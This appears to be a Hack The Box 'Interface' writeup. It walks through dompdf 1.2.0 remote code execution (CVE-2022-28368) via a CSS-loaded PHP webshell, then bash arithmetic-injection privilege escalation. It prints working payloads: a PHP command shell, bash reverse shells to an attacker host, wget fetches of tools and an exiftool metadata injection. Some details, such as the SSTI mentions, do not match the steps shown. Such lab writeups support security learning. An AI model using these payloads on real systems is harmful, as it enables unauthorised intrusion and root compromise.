🖥️ HTB: Interface – Writeup / Walkthrough

Difficulty: Medium
Tags: dompdf CVE-2022-28368, RCE, SSTI, Bash Arithmetic Injection, Reverse Shell

🧠 TL;DR

    📄 Exploited dompdf 1.2.0 (CVE-2022-28368) to get RCE via malicious CSS

    🐚 Gained initial access as www-data

    🧮 Abused Bash Arithmetic Injection in a cron-executed script for privilege escalation

🔎 Enumeration

Initial nmap scan revealed:

22/tcp open  ssh
80/tcp open  http

Website on port 80 was static and didn’t offer anything juicy at first glance.

However, inspecting headers in Burp Suite, I noticed a Content-Security-Policy referring to another domain:

prd.rendering-api.interface.htb

📌 Added to /etc/hosts:

echo "<TARGET_IP> prd.rendering-api.interface.htb" | sudo tee -a /etc/hosts

Navigated to the new subdomain — received a 404 error, but that meant it was live. Time to go digging.
🧪 Fuzzing the API

Used ffuf to enumerate paths:

ffuf -u http://prd.rendering-api.interface.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0

Discovered /api.

Drilled further into /api and found /api/html2pdf — which responded with missing parameters when hit.

Suspected a POST API — saved a basic POST template in html2john.req and tested param names using:

ffuf -request html2john.req -request-proto http -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt

🎯 Found parameter: html

Sending this gave back a PDF response — but corrupted. Found the HTTP headers were included in the response, stripped them manually.

Ran exiftool on the PDF and discovered:

Producer: dompdf 1.2.0

💥 Exploiting dompdf (CVE-2022-28368)

The version was vulnerable to RCE via crafted CSS.

Referencing:

    https://github.com/positive-security/dompdf-rce

    https://positive.security/blog/dompdf-rce

This vuln allows CSS to drop a .php file in dompdf’s font cache directory, which is later executed on the server.

🧰 Created a malicious style.css:

@font-face {
  font-family: 'Exploit';
  src: url('http://<attacker-ip>/exploit.php');
}

And exploit.php:

<?php system($_GET['cmd']); ?>

Linked CSS in the POST request:

{
  "html": "<link rel='stylesheet' href='http://<attacker-ip>/style.css'>"
}

Intercepted the request to catch the GET request for exploit.php — confirmed it's working.
🐚 Gaining a Reverse Shell

Replaced exploit.php payload with a simple bash one-liner:

<?php system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>

Started listener:

nc -lvnp 4444

Triggered the payload and got a reverse shell as www-data.
📦 Privilege Escalation

Uploaded pspy64 to enumerate cron jobs:

wget http://<attacker-ip>/pspy64
chmod +x pspy64
./pspy64

🕵️ Observed recurring execution of cleancache.sh via bash.

Inspected the script. It looked normal, but included this:

(( rm -rf /tmp/CleanMe ))

That's arithmetic evaluation, not standard command exec. Looked deeper and found it was vulnerable to bash arithmetic injection.

Referenced:

    NCC Group Blog

🔧 Exploiting Bash Arithmetic Injection

Steps:

    Created malicious shell.sh:

#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/5555 0>&1

    Made it executable:

chmod +x shell.sh

    Created dummy file CleanMe

touch CleanMe

    Used exiftool to inject metadata:

exiftool -Producer='$(/tmp/shell.sh)' CleanMe

    Moved CleanMe to /tmp:

mv CleanMe /tmp/

    Listener ready:

nc -lvnp 5555

Waited… then 🔥 rooted the box.
🏁 Flags

    user.txt ✔️

    root.txt ✔️

🧬 Git Commit Message

git commit -m "📄 HTB: Interface – dompdf RCE (CVE-2022-28368) ➜ bash arithmetic injection → root shell"

🔚 Final Thoughts

    dompdf-based RCEs are often overlooked — always check PDF generators for metadata.

    SSTI and CSS payload chains can lead to stealthy exploitation paths.

    Bash arithmetic injection is a rare but powerful privesc technique.
